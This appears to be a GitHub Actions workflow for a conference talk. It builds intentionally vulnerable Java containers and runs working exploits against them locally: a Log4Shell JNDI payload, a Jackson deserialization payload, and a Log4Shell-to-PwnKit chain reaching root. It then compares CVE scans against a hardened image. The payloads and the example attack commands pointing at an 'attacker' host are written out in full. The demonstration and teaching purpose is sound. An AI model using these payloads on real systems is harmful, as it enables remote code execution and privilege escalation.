name: "🔓 Vulnerable App — Full Demo"

# Automated security demo: builds all 3 images, exploits them, compares results.
# Trigger manually via GitHub Actions UI during your conference talk.

on:
  workflow_dispatch:

jobs:
  # ═══════════════════════════════════════════════════════════════
  demo-log4shell:
    name: "💀 Demo 1 — Log4Shell (CVE-2021-44228)"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start callback server + vulnerable app"
        run: |
          # The callback server includes an LDAP server on port 1389 and HTTP on 9999
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:root
          # Wait for app readiness
          for i in $(seq 1 30); do
            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
            sleep 2
          done
          echo "✅ App ready"

      - name: "✅ Normal product search (legitimate use)"
        run: |
          echo "## 💀 Demo 1 — Log4Shell (CVE-2021-44228)" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**What is Log4Shell?** A zero-day RCE in Apache Log4j 2.x (< 2.15). Any user input" >> $GITHUB_STEP_SUMMARY
          echo "that gets logged triggers a JNDI lookup, allowing the attacker to load and execute" >> $GITHUB_STEP_SUMMARY
          echo "arbitrary Java classes from a remote server." >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### ✅ Step 1 — Normal Request (looks innocent)" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo 'curl "http://localhost:8080/api/products/search?q=shirt"' >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "Response:" >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          curl -s "http://localhost:8080/api/products/search?q=shirt" | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "> The endpoint just searches products. The developer logs the query — standard practice." >> $GITHUB_STEP_SUMMARY

      - name: "💀 Send JNDI injection payload"
        run: |
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 💀 Step 2 — Attacker sends JNDI payload as search query" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "The attacker replaces the search term with a JNDI lookup expression:" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"' >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**What happens inside the app:**" >> $GITHUB_STEP_SUMMARY
          echo "1. Controller calls \`log.info(\"Product search query: \" + q)\`" >> $GITHUB_STEP_SUMMARY
          echo "2. Log4j 2.14.1 sees \`\${jndi:ldap://...}\` in the message" >> $GITHUB_STEP_SUMMARY
          echo "3. Log4j performs an LDAP lookup to the attacker's server" >> $GITHUB_STEP_SUMMARY
          echo "4. Attacker's LDAP server responds with a reference to a malicious Java class" >> $GITHUB_STEP_SUMMARY
          echo "5. Victim JVM downloads and executes the class → **Remote Code Execution**" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          # Fire the exploit — URL-encoded: ${jndi:ldap://host.docker.internal:1389/log4shell-pwned}
          RESP=$(curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D")
          echo "HTTP Response (app still responds normally — victim doesn't notice!):" >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          echo "$RESP" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          sleep 3

      - name: "📡 Check what the attacker received"
        run: |
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 📡 Step 3 — Attacker's server logs" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "The attacker's LDAP server received the JNDI lookup from the victim:" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          docker logs callback 2>&1 | grep -E "LDAP|Victim|exploit|Serving|class" | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "Victim app's internal logs (shows the JNDI lookup happening):" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          docker logs vuln-app 2>&1 | grep -iE "jndi|ldap|lookup|EXPLOIT|Running as" | tail -15 | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 🎯 Callback dashboard (proof of exploitation):" >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          curl -s http://localhost:9999/dashboard | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "> **Impact**: With a single HTTP request, the attacker achieved Remote Code Execution." >> $GITHUB_STEP_SUMMARY
          echo "> The developer did nothing wrong — they just logged user input." >> $GITHUB_STEP_SUMMARY
          echo "> The vulnerability is entirely in the **log4j-core 2.14.1** dependency." >> $GITHUB_STEP_SUMMARY

      - name: "🧹 Cleanup"
        if: always()
        run: |
          docker stop vuln-app callback 2>/dev/null || true
          docker rm vuln-app callback 2>/dev/null || true

  # ═══════════════════════════════════════════════════════════════
  demo-jackson:
    name: "💀 Demo 2 — Jackson Deserialization (CVE-2019-14379)"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build & start"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          cd "../Callback Server" && docker build -t callback-server . && cd -
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

      - name: "✅ Normal JSON import"
        run: |
          echo "## 💀 Demo 2 — Jackson Deserialization RCE (CVE-2019-14379)" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**What is this?** Jackson's \`enableDefaultTyping()\` allows JSON payloads to specify" >> $GITHUB_STEP_SUMMARY
          echo "which Java class to instantiate. An attacker can craft JSON that creates dangerous objects" >> $GITHUB_STEP_SUMMARY
          echo "(URL connections, file writers, runtime exec) on the server." >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### ✅ Step 1 — Normal Request" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo 'curl -X POST http://localhost:8080/api/users/import -d '\''{"name":"Alice"}'\''' >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          curl -s -X POST http://localhost:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY

      - name: "💀 Polymorphic deserialization attack"
        run: |
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 💀 Step 2 — Attacker sends polymorphic payload" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "The attacker sends JSON that tells Jackson to instantiate \`java.net.URL\`:" >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          echo '["java.net.URL", "http://attacker:9999/jackson-rce-proof"]' >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
            -H "Content-Type: application/json" \
            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]')
          echo "Response:" >> $GITHUB_STEP_SUMMARY
          echo '```json' >> $GITHUB_STEP_SUMMARY
          echo "$RESP" | python3 -m json.tool 2>/dev/null || echo "$RESP" | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**\`parsed_type: URL\` proves the attacker controlled which Java class was instantiated!**" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "In a real attack, the attacker uses gadget classes (e.g., \`TemplatesImpl\`, \`JdbcRowSetImpl\`)" >> $GITHUB_STEP_SUMMARY
          echo "that trigger code execution during deserialization. The fix: **never use \`enableDefaultTyping()\`**" >> $GITHUB_STEP_SUMMARY
          echo "and keep jackson-databind updated." >> $GITHUB_STEP_SUMMARY

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

  # ═══════════════════════════════════════════════════════════════
  demo-pwnkit:
    name: "💀 Demo 3 — Full Chain: Log4Shell → RCE → PwnKit → Root"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .
          cd "../Callback Server" && docker build -t callback-server .

      - name: "🚀 Start attacker infrastructure + victim"
        run: |
          # Attacker's server: LDAP (1389) + HTTP for exploit classes & payloads (9999)
          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
          # Victim: runs as non-root (appuser) but has vulnerable pkexec + gcc
          docker run -d --name vuln-app \
            --add-host=host.docker.internal:host-gateway \
            -p 8080:8080 vuln-app:escalation
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
          echo "✅ Victim (non-root + vulnerable packages) and attacker ready"

      - name: "💀 THE ATTACK — Single HTTP request → root"
        run: |
          echo "## 💀 Demo 3 — Full Exploit Chain" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**A SINGLE HTTP GET request chains two CVEs to gain root access:**" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "| Step | What happens | CVE |" >> $GITHUB_STEP_SUMMARY
          echo "|------|-------------|-----|" >> $GITHUB_STEP_SUMMARY
          echo "| 1 | Attacker sends search query with JNDI payload | — |" >> $GITHUB_STEP_SUMMARY
          echo "| 2 | Log4j performs JNDI/LDAP lookup to attacker | CVE-2021-44228 |" >> $GITHUB_STEP_SUMMARY
          echo "| 3 | LDAP server returns reference to malicious class | — |" >> $GITHUB_STEP_SUMMARY
          echo "| 4 | Victim downloads & executes attacker's Java class | — |" >> $GITHUB_STEP_SUMMARY
          echo "| 5 | Malicious class downloads PwnKit exploit source | — |" >> $GITHUB_STEP_SUMMARY
          echo "| 6 | Compiles with gcc, exploits pkexec SUID → **ROOT** | CVE-2021-4034 |" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### The attack command:" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo 'curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"' >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          # Fire the actual exploit
          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
          sleep 8

          echo "### 📡 Attacker's LDAP server (received JNDI lookup from victim):" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          docker logs callback 2>&1 | grep -E "LDAP|Victim|exploit|Serving|class|download" | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          echo "### 🎯 Victim container logs (RCE + privilege escalation):" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          docker logs vuln-app 2>&1 | grep -iE "EXPLOIT|uid=|root|pwnkit|Running as|Escalat|FOUND|Step" | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "> **Result**: Started as \`appuser\` (non-root), ended as \`uid=0(root)\`." >> $GITHUB_STEP_SUMMARY
          echo "> Running as non-root is NOT enough if vulnerable OS packages (pkexec, gcc) are present." >> $GITHUB_STEP_SUMMARY

      - name: "🔒 Same attack on SAFE image — blocked"
        run: |
          docker stop vuln-app; docker rm vuln-app
          docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:safe
          for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done

          echo "### 🔒 Same attack on the SAFE image" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "The safe image uses \`eclipse-temurin:25-jre\` (modern, minimal, no extra packages)." >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" || true
          sleep 3

          echo '```' >> $GITHUB_STEP_SUMMARY
          docker logs vuln-app 2>&1 | tail -10 | tee -a $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "✅ **JNDI lookup is blocked** — Java 25 defaults \`trustURLCodebase=false\`, preventing remote class loading." >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "Even if it weren't blocked: no gcc, no pkexec, no curl → attacker can't do anything useful." >> $GITHUB_STEP_SUMMARY

      - name: "🧹 Cleanup"
        if: always()
        run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null

  # ═══════════════════════════════════════════════════════════════
  scan-compare:
    name: "📊 CVE Scan — Image Comparison"
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: "Vulnerable Application Old Java"

    steps:
      - uses: actions/checkout@v4

      - name: "🏗️ Build all images"
        run: |
          docker build -f Dockerfile.root -t vuln-app:root .
          docker build -f Dockerfile.escalation -t vuln-app:escalation .
          docker build -f Dockerfile.nonroot -t vuln-app:safe .

      - name: "🔍 Install Trivy"
        run: curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

      - name: "📊 Scan & compare"
        run: |
          echo "## 📊 Image Security Comparison" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "Three Docker images running the **exact same application** (same JAR), but with" >> $GITHUB_STEP_SUMMARY
          echo "different base images and configurations:" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          declare -A TOTALS CRITS HIGHS SIZES

          for IMG in root escalation safe; do
            JSON=$(trivy image --format json --quiet "vuln-app:$IMG" 2>/dev/null || echo '{"Results":[]}')
            TOTALS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(len(r.get('Vulnerabilities',[])) for r in d.get('Results',[])))" 2>/dev/null || echo "0")
            CRITS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='CRITICAL'))" 2>/dev/null || echo "0")
            HIGHS[$IMG]=$(echo "$JSON" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sum(1 for r in d.get('Results',[]) for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='HIGH'))" 2>/dev/null || echo "0")
            SIZES[$IMG]=$(docker image inspect "vuln-app:$IMG" --format='{{.Size}}' | awk '{printf "%.0f", $1/1024/1024}')
          done

          echo "| Metric | 🔴 root | ⚠️ escalation | 🟢 safe |" >> $GITHUB_STEP_SUMMARY
          echo "|--------|---------|---------------|---------|" >> $GITHUB_STEP_SUMMARY
          echo "| Total CVEs | ${TOTALS[root]} | ${TOTALS[escalation]} | ${TOTALS[safe]} |" >> $GITHUB_STEP_SUMMARY
          echo "| CRITICAL | ${CRITS[root]} | ${CRITS[escalation]} | ${CRITS[safe]} |" >> $GITHUB_STEP_SUMMARY
          echo "| HIGH | ${HIGHS[root]} | ${HIGHS[escalation]} | ${HIGHS[safe]} |" >> $GITHUB_STEP_SUMMARY
          echo "| Image Size | ${SIZES[root]} MB | ${SIZES[escalation]} MB | ${SIZES[safe]} MB |" >> $GITHUB_STEP_SUMMARY
          echo "| User | root | appuser | ubuntu |" >> $GITHUB_STEP_SUMMARY
          echo "| Has pkexec (PwnKit) | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
          echo "| Has gcc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
          echo "| Has curl/wget/nc | ✅ | ✅ | ❌ |" >> $GITHUB_STEP_SUMMARY
          echo "| Base image | temurin:11-jre-jammy | temurin:11-jre-jammy | temurin:25-jre |" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          # Plain text table to stdout
          echo ""
          printf "%-18s %-12s %-14s %-12s\n" "Metric" "root" "escalation" "safe"
          printf "%-18s %-12s %-14s %-12s\n" "──────────────────" "────────────" "──────────────" "────────────"
          printf "%-18s %-12s %-14s %-12s\n" "Total CVEs" "${TOTALS[root]}" "${TOTALS[escalation]}" "${TOTALS[safe]}"
          printf "%-18s %-12s %-14s %-12s\n" "CRITICAL" "${CRITS[root]}" "${CRITS[escalation]}" "${CRITS[safe]}"
          printf "%-18s %-12s %-14s %-12s\n" "HIGH" "${HIGHS[root]}" "${HIGHS[escalation]}" "${HIGHS[safe]}"
          printf "%-18s %-12s %-14s %-12s\n" "Image Size (MB)" "${SIZES[root]}" "${SIZES[escalation]}" "${SIZES[safe]}"
          echo ""

          echo "### 🔴 Top vulnerabilities — vuln-app:root" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:root 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 🟢 Scan — vuln-app:safe" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          trivy image --severity CRITICAL,HIGH --no-progress vuln-app:safe 2>/dev/null | head -50 >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY

